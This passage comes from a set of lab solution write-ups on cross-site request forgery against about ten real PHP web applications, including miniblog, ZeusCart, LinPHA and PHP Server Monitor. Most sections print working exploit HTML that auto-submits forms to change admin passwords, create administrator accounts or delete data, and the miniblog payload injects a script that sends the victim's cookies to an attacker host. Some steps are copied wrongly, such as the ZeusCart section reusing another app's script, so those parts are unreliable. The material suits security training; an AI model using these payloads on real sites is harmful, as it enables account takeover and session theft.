"-----------------------------7815509202030471153167006625--\r\n"; 
 
var aBody = new Uint8Array(body.length); 
 
for (var i = 0; i < aBody.length; i++) 
 
aBody[i] = body.charCodeAt(i); 
 
xhr.send(new Blob([aBody])); 
 
} 
 
submitRequest(); 
</script> 
<form action="#"> 
 
<input type="button" value="Submit request" onclick="submitRequest();" /> 
</form> 
  </body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
Click on the “Submit request” button. 
 
Step 6: ​Check the home page of the web application. 
 
URL: ​http://1gy80jl9ot9mjo8h5qsezfjkm.mumbaix.attackdefenselabs.com/ 
 
 
 
The CSRF was successful and as a result 2 news were posed.  
 
 
 
 
References:  
 
1.
Spacemarc News (​http://www.spacemarc.it​)  
2.
Spacemarc News - Cross-Site Request Forgery (Add New Post) 
 (​https://www.exploit-db.com/exploits/40493​)  
 
 
 
Name 
Miniblog 
URL 
https://www.attackdefense.com/challengedetails?cid=289 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “miniblog vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40480 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
application. 
 
URL: ​http://smscrzkgcdif01b4b6zjmrqdd.mumbaix.attackdefenselabs.com/adm/ 
 
 
 
Credentials: 
 
●
Password​: password 
 
 
Admin Dashboard 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html> <!-- CSRF PoC --> <body> <form 
action="http://smscrzkgcdif01b4b6zjmrqdd.mumbaix.attackdefenselabs.com/adm/admin.php?mode=add&
id=%3Cbr%20/%3E%3Cb%3ENotice%3C/b%3E:%20%20Undefined%20variable:%20post%20in%20%3
Cb%3EC:\xampp\htdocs\miniblog\adm\edit.php%3C/b%3E%20on%20line%20%3Cb%3E8%3C/b%3E%3
Cbr%20/%3E" 
method="POST"> <input type="hidden" name="data&#91;post&#95;title&#93;" 
value="<script>location&#46;href&#32;&#61;&#32;â&#128;&#152;http&#58;&#47;&#47;www&#46;attack
ersite&#46;com&#47;stealer&#46;php&#63;cookie&#61;â&#128;&#153;&#43;document&#46;cookie&#59
;<&#47;script>" 
/> <input type="hidden" name="data&#91;post&#95;content&#93;" 
value="tester" /> <input type="hidden" name="data&#91;published&#93;" 
value="1" /> <input type="hidden" name="miniblog&#95;PostBack" value="Add" 
/> <input type="submit" value="Submit request" /> </form> <script> 
document.forms[0].submit(); </script> </body> </html> 
 
 
Save the HTML script as csrf.html 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
 
 
 
 
 
 
 
 
The CSRF page will redirect to the website and a post will be added. 
 
Step 6: ​Reload the admin index page to see the effect. 
 
 
 
The CSRF was successful and as a result a page was added.  
 
 
 
 
 
 
References:  
 
1.
MiniBlog  (​http://www.spyka.net/scripts/php/miniblog​)  
2.
miniblog 1.0.1 - Cross-Site Request Forgery (Add New Post) 
(​https://www.exploit-db.com/exploits/40480​)  
 
 
 
Name 
PHP weby 
URL 
https://www.attackdefense.com/challengedetails?cid=290  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “php weby vulnerability” and look for publicly available exploits. 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/24433 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://86mg6c8fphang9uwx9hevsf1d.mumbaix.attackdefenselabs.com/admin/ 
 
 
 
Credentials: 
 
●
Username​: admin 
●
Password​: 123321 
 
Admin Dashboard: 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<body onload="javascript:document.forms[0].submit()"> 
<form 
action="http://86mg6c8fphang9uwx9hevsf1d.mumbaix.attackdefenselabs.com/admin/options.ph
p?r=admin" method="post"> 
<input type="text" name="ADMIN_NAME" value="admin"/> 
<input type="text" name="ADMIN_MAIL" value="admin@toattacker.tld"/> 
<input type="text" name="usr" value="pwned"/> 
<input type="password" name="pass1" value="pwned"/> 
<input type="password" name="pass2" value="pwned"/> 
<input type="hidden" name="oldusr" value="admin"/> 
<input type="submit" value="Save" class="ss"/> 
</form> 
 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
The CSRF page will be redirected to this page and the email,username and password will get 
modified. 
 
Step 7: ​Login with the new credentials to verify the exploitation. 
 
●
Username:​ pwned 
●
Password:​ pwned 
 
 
 
 
 
 
 
The CSRF was successful and as a result credentials were modified.  
 
 
References:  
 
1.
PHP Weby directory (​http://phpweby.com​)  
2.
PHP weby directory software 1.2 - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/24433​)  
 
 
 
Name 
PHP Ticket System 
URL 
https://www.attackdefense.com/challengedetails?cid=291  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “PHP Ticket System vulnerability exploit db” and look for publicly 
available exploits. 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/26007 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
application. 
 
URL: ​http://ucwqydilsnqnagslzh4s0wrb3.mumbaix.attackdefenselabs.com/?p=login 
 
 
Credentials: 
 
●
Username​: admin 
●
Password​: 123321 
 
Admin Dashboard: 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
 ​<html> 
  <head> 
 </head> 
 <body> 
 <!--  php ticket  --> 
 <form 
action="http://ucwqydilsnqnagslzh4s0wrb3.mumbaix.attackdefenselabs.com/?p=process_change_password&id=1" 
method="POST" id="csrf" name="csrf" onload="go()"> 
   <input type="hidden" name="new_password" value="12351235"/> 
   <input type="hidden" name="confirm_password" value="12351235"/> 
   <input type="hidden" name="submit" value="Change Password"/> 
   <input type="submit" value="Submit form" /> 
   </form> 
   </form> 
   <script language="JavaScript" type="text/javascript"> 
   document.csrf.submit(); 
   </script> 
   </body> 
   </html> 
  
 
Save the HTML script as csrf.html 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
Click on Submit form. 
 
 
 
The password has been modified. 
 
Step 6: ​Logout and login with the new credentials. 
 
●
Username​:admin 
●
Password​:12351235 
 
 
 
The CSRF was successful and as a result a page was added.  
 
 
 
References:  
 
1.
PHP Ticket System (​http://sourceforge.net/projects/phpticketsystem/​)  
2.
PHP Ticket System Beta 1 - Cross-Site Request Forgery 
(​https://www.exploit-db.com/exploits/26007​)  
 
 
 
Name 
Zeus Cart 
URL 
https://www.attackdefense.com/challengedetails?cid=292  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “zeuscart vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/38223/  
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and login to the 
web application 
 
URL: ​http://zxa3nv6j92z84802merac3ozw.mumbaix.attackdefenselabs.com/admin/ 
 
 
 
Credentials: 
 
●
Username​: admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
 ​<html> 
  <head> 
 </head> 
 <body> 
 <!--  php ticket  --> 
 <form 
action="http://ucwqydilsnqnagslzh4s0wrb3.mumbaix.attackdefenselabs.com/?p=process_change_password&id=1" 
method="POST" id="csrf" name="csrf" onload="go()"> 
   <input type="hidden" name="new_password" value="12351235"/> 
   <input type="hidden" name="confirm_password" value="12351235"/> 
   <input type="hidden" name="submit" value="Change Password"/> 
   <input type="submit" value="Submit form" /> 
   </form> 
   </form> 
   <script language="JavaScript" type="text/javascript"> 
   document.csrf.submit(); 
   </script> 
   </body> 
   </html> 
  
 
Save the HTML script as csrf.html 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
 
 
 
The CSRF page will be redirected to the website and the credentials will be updated. 
 
Step 6: ​Logout and login with the new credentials. 
 
●
Username​: admin2 
●
Password​: admin 
 
 
 
 
The CSRF was successful and as a result a credentials were changed.  
 
 
References:  
 
1.
ZeusCart (​https://zeuscart.com/​)  
2.
ZeusCart 4.0 - Cross-Site Request Forgery (​https://www.exploit-db.com/exploits/38223​)  
 
 
 
Name 
Grawlix CMS 
URL 
https://www.attackdefense.com/challengedetails?cid=293 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “grawlix cms vulnerability exploit db” and look for publicly available 
exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/39084 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application 
 
URL: ​http://b58jalbvna8jcswmpgqf820nd.mumbaix.attackdefenselabs.com/_admin/ 
 
 
 
Credentials: 
 
●
Username​: admin 
●
Password​: password 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
 <html> 
  <body> 
    <form 
action="http://b58jalbvna8jcswmpgqf820nd.mumbaix.attackdefenselabs.com/_admin/user.config.php" 
method="POST"> 
      <input type="hidden" name="username[1]" value="admin" /> 
      <input type="hidden" name="email[1]" value="admin@example.com" /> 
      <input type="hidden" name="password[1]" value="admin" /> 
      <input type="hidden" name="confirm_password[1]" value="admin" /> 
      <input type="hidden" name="submit" value="save" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
  </body> 
</html> 
 
  
Save the HTML script as csrf.html 
 
 
 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
Click on Submit request. 
 
 
 
 
 
Step 6: ​Logout and login with the new credentials. 
 
Credentials: 
●
Username​:admin 
●
Password​:admin 
 
 
 
The CSRF was successful and as a result a credentials were changed.  
 
 
References:  
 
1.
Grawlix CMS (​http://www.getgrawlix.com/​)  
2.
Grawlix 1.0.3 - Cross-Site Request Forgery (​https://www.exploit-db.com/exploits/39084​) 
 
 
 
Name 
LinPHA 
URL 
https://www.attackdefense.com/challengedetails?cid=297 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “linpha exploit db” and look for publicly available exploits. 
 
 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/31256 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
application. 
 
URL: ​http://jbauerr82tmkyrjbft3s1lwey.mumbaix.attackdefenselabs.com/login.php 
 
 
 
Credentials: 
 
●
Username​: admin 
●
Password​: password 
 
 
Admin Dashboard 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html lang="en"> 
<head> 
<title>CSRF Exploit to Create New Administrator Account</title> 
</head> 
<body> 
<form 
action="http://3708jeq2zp05vi41n41pp7uyk.mumbaix.attackdefenselabs.com/lib/usermanagement/usersE
dit.php" 
id="formid" method="post"> 
<input type="hidden" name="CSRFName" value="" /> 
<input type="hidden" name="CSRFToken" value="" /> 
<input type="hidden" name="user_id" value="" /> 
<input type="hidden" name="user_login" value="" /> 
<input type="hidden" name="login" value="new_admin" /> 
<input type="hidden" name="firstName" value="new_administrator_fname" /> 
<input type="hidden" name="lastName" value="new_administrator_lname" /> 
<input type="hidden" name="password" value="new_administrator_password" /> 
<input type="hidden" name="emailAddress" value="new_administrator@admin.com" /> 
<input type="hidden" name="rights_id" value="8" /> 
<input type="hidden" name="locale" value="en_GB" /> 
<input type="hidden" name="authentication" value="" /> 
<input type="hidden" name="user_is_active" value="on" /> 
<input type="hidden" name="doAction" value="doCreate" /> 
<input type="hidden" name="do_update" value="Save" /> 
</form> 
<script> 
document.getElementById('formid').submit(); 
</script> 
</body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
Click on Invia button. 
 
 
 
 
 
 
 
The CSRF was successful and as a result email settings were altered.  
 
 
References:  
 
1.
LinPHA (​http://sourceforge.net/projects/linpha/​)  
2.
LinPHA 1.3.4 - Multiple Vulnerabilities  (​https://www.exploit-db.com/exploits/31256​) 
 
 
 
Name 
MyBB Admin Notes Plugin 
URL 
https://www.attackdefense.com/challengedetails?cid=319  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “MyBB Admin Notes Plugin vulnerability” and look for publicly 
available exploits. 
 
 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/44624 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application. 
 
URL: ​http://o86w0lorpldf7u3nlvl71ntf2.mumbaix.attackdefenselabs.com/admin/ 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password1 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​The CSRF exploit will delete the notes but no notes are present. Create sample notes 
 
 
Click on Save Notes 
 
 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html> 
<body> 
<img style="display:none" 
src="http://o86w0lorpldf7u3nlvl71ntf2.mumbaix.attackdefenselabs.com/admin/index.php?empty=table" 
alt=""> 
</body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
 
 
 
No output received. 
 
Step 7: ​Reload the index.php page of admin panel. 
 
 
 
The CSRF was successful and as a result the added note was deleted.  
 
References:  
 
1.
MyBB (​https://mybb.com/​) 
2.
MyBB Admin Notes Plugin (​https://mods.mybb.com/view/admin-notes​)  
3.
MyBB Admin Notes Plugin 1.1 - Cross-Site Request Forgery 
(​https://www.exploit-db.com/exploits/44624​) 
 
 
 
Name 
PHP Server Monitor 
URL 
https://www.attackdefense.com/challengedetails?cid=320 
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
The version of the web application is revealed in the footer of the web application. 
 
Step 2: ​Search on google “php server monitor 3.1.1 exploit” and look for publicly available 
exploits. 
 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/38572 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application 
 
URL: ​http://of9qftmhjpxtc4ez02rjp19ch.mumbaix.attackdefenselabs.com/ 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
Step 4: ​Navigate to “users” section by clicking on Users. 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
 
 
HTML Script: 
 
<!DOCTYPE> 
<html> 
<body onLoad="doit()"> 
<script> 
function doit(){ 
var e=document.getElementById('HELL') 
e.submit() 
} 
</script> 
<form id="HELL" action=" 
http://of9qftmhjpxtc4ez02rjp19ch.mumbaix.attackdefenselabs.com/?&mod=user&action=save&id=0" 
method="post"> 
<input type="text" name="user_name" value="hyp3rlinx" > 
<input type="text" name="name" value="hyp3rlinx"> 
<input type="text" name="level" value="20"> 
<input type="text" name="password" value="abc123"> 
<input type="text" name="password_repeat" value="abc123"> 
<input type="text" name="email" value="ghostofsin@abyss.com"> 
<input type="text" name="mobile" value=""> 
<input type="text" name="pushover_key" value=""> 
<input type="text" name="pushover_device" value=""> 
</form> 
</body> 
</html> 
 
Save the HTML script as csrf.html 
 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
The CSRF was successful and as a result user was added.  
 
References:  
 
1.
PHP Server Monitor (​www.phpservermonitor.org​)  
2.
PHP Server Monitor 3.1.1 - Multiple Cross-Site Request Forgery Vulnerabilities 
(​https://www.exploit-db.com/exploits/38572​) 
 
 
 
Name 
ApPHP MicroBlog 1.0.2 
URL 
https://www.attackdefense.com/challengedetails?cid=321  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “ApPHP MicroBlog 1.0.2 vulnerability exploit db” and look for publicly 
available exploits. 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​ ​https://www.exploit-db.com/exploits/40506/ 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal. 
 
URL: ​http://fycxejqmrlfw5ffkgfqaqh8xk.mumbaix.attackdefenselabs.com/index.php?admin=login 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: password 
 
Admin Dashboard: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​Navigate to “Authors” section under Accounts drop down menu. 
 
 
 
Step 5: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
 
HTML Script: 
 
<html> 
  <body> 
    <script> 
      function submitRequest() 
      { 
        var xhr = new XMLHttpRequest(); 
        xhr.open("POST", 
"http://fycxejqmrlfw5ffkgfqaqh8xk.mumbaix.attackdefenselabs.com/index.php?admin=authors_manageme
nt", true); 
        xhr.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"); 
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5"); 
        xhr.setRequestHeader("Content-Type", 
"multipart/form-data;boundary=---------------------------25472311920733601781889948655"); 
        xhr.withCredentials = true; 
        var body = 
"-----------------------------25472311920733601781889948655\r\n" + 
          "Content-Disposition: form-data; name=\"mg_action\"\r\n" + 
          "\r\n" + 
          "create\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_rid\"\r\n" + 
          "\r\n" + 
          "-1\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_sorting_fields\"\r\n" 
+ 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_sorting_types\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_page\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_operation\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_operation_type\"\r\n" 
+ 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_operation_field\"\r\n" 
+ 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_search_status\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"mg_language_id\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"show_about_me\"\r\n" + 
          "\r\n" + 
          "0\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"account_type\"\r\n" + 
          "\r\n" + 
          "author\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"last_login\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"first_name\"\r\n" + 
          "\r\n" + 
          "Mehmet\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"last_name\"\r\n" + 
          "\r\n" + 
          "mersin\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"email\"\r\n" + 
          "\r\n" + 
          "mehmet@yopmail.com\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"user_name\"\r\n" + 
          "\r\n" + 
          "Zer0\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"password\"\r\n" + 
          "\r\n" + 
          "mehmet\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"avatar\";filename=\"\"\r\n"  
+ 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"about_me\"\r\n" + 
          "\r\n" + 
          "denemddendemdendjendk\r\n" + 
          "-----------------------------25472311920733601781889948655\r\n" 
+ 
          "Content-Disposition: form-data; name=\"is_active\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
 
"-----------------------------25472311920733601781889948655--\r\n"; 
        var aBody = new Uint8Array(body.length); 
        for (var i = 0; i < aBody.length; i++) 
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody])); 
      } 
      submitRequest(); 
    </script> 
    <form action="#"> 
      <input type="button" value="Submit request" 
onclick="submitRequest();" /> 
    </form> 
  </body> 
</html> 
 
 
 
Save the HTML script as csrf.html 
 
 
 
 
 
 
Step 6: ​Open the HTML script in the same browser session. 
 
 
Step 7: ​Click on “Submit request” and reload the “Authors” page to see the effect. 
 
 
 
The CSRF was successful and as a result a new Author was added.  
 
 
 
 
 
 
References:  
 
1.
ApPHP MicroBlog  (​http://www.scriptdungeon.com/jump.php?ScriptID=9162​)  
2.
ApPHP MicroBlog 1.0.2 - Cross-Site Request Forgery (Add New Author) 
(​https://www.exploit-db.com/exploits/40506​)  
 
 
 
Name 
Article Setup 1.0 
URL 
https://www.attackdefense.com/challengedetails?cid=322  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “Articlesetup 1.0  vulnerability exploit db” and look for publicly 
available exploits. 
 
 
 
 
The exploit db link contains the HTML script required to exploit the vulnerability. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39889 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. The login credentials 
are provided in the challenge description. Navigate to the admin login portal and log into the 
web application. 
 
URL: ​http://9zj9144dzq6t13n0obf463jir.mumbaix.attackdefenselabs.com/admin/login.php 
 
 
 
Credentials: 
 
●
Username: ​admin 
●
Password​: 123321 
 
Admin Dashboard: 
 
 
 
Step 4: ​Copy the HTML script provided at exploit db link and update the URL in the request.  
 
HTML Script: 
 
<html> 
 <body> 
  <form method="post" 
action="http://9zj9144dzq6t13n0obf463jir.mumbaix.attackdefenselabs.com/admin/adminsettings.php"> 
      <input type="hidden" name="update" value="1"> 
      <input type="hidden" name="pass1" type="hidden" value="12345678" > 
      <input type="hidden" name="pass2" type="hidden" value="12345678" > 
      <input type="submit" value="create"> 
  </form> 
 </body> 
</html> 
 
 
Save the HTML script as csrf.html 
 
 
 
Step 5: ​Open the HTML script in the same browser session. 
 
 
 
 
Click on create button. 
 
 
 
 
Step 6: ​Logout and login again with new credentials. 
 
●
Username:​ admin 
●
Password:​ 12345678 
 
 
 
The CSRF was successful and as a result the password was changed.  
 
 
 
 
 
References:  
 
1.
ArticleSetup 1.00 (​http://articlesetup.com/​)  
2.
ArticleSetup 1.00 - Cross-Site Request Forgery (Change Admin Password) 
(​https://www.exploit-db.com/exploits/39889​)  
 
 
 
Name 
Advanced Electron Forum 
URL 
https://www.attackdefense.com/challengedetails?cid=323  
Type 
Real World Webapps : CSRF 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
